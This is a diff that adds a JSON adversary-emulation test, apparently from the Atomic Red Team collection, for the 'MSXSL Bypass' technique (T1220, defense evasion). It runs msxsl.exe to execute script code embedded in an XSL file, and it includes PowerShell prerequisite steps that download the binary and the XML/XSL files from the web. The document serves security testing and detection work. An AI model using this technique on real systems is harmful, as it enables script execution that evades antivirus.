@@ -1,0 +1,57 @@
+{
+    "name": "MSXSL Bypass using local files",
+    "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload.  Requires download of MSXSL. No longer available from Microsoft. (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )  Open Calculator.exe when test successfully executed, while AV turned off. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
+        "cleanup_command": "del \"#{msxsl_exe}\" >nul 2>&1\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1220",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "XSL Script Processing",
+    "source": "ART",
+    "uuid": "ca23bfb2-023f-49c5-8802-e66997de462d",
+    "arguments": {
+        "xmlfile": {
+            "description": "Location of the test XML file on the local filesystem.",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml"
+        },
+        "xslfile": {
+            "description": "Location of the test XSL script file on the local filesystem.",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl"
+        },
+        "msxsl_exe": {
+            "description": "Location of the MSXSL executable.",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "XML file must exist on disk at specified location (#{xmlfile})\n",
+            "prereq_command": "if (Test-Path \"#{xmlfile}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{xmlfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml\" -OutFile \"#{xmlfile}\"\n"
+        },
+        {
+            "description": "XSL file must exist on disk at specified location (#{xslfile})\n",
+            "prereq_command": "if (Test-Path \"#{xslfile}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{xslfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl\" -OutFile \"#{xslfile}\"\n"
+        },
+        {
+            "description": "msxsl.exe must exist on disk at specified location (#{msxsl_exe})\n",
+            "prereq_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
